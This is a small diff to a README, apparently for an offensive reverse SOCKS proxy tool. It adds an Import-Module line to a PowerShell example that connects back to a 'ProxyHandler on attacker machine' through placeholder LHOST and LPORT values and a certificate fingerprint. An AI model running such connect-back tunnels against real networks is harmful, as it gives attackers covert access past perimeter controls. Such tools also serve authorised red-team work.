@@ -11,5 +11,6 @@ sudo python2.7 ReverseSocksProxyHandler.py
 # Example
 Connect back to ProxyHandler on attacker machine with certificate fingerprint.
 ```
+Import-Module Invoke-ReverseSocksProxy.psm1
 Invoke-ReverseSocksProxy -remotePort LPORT -remoteHost LHOST -certFingerprint 'CERT_FINGERPRINT'
 ```
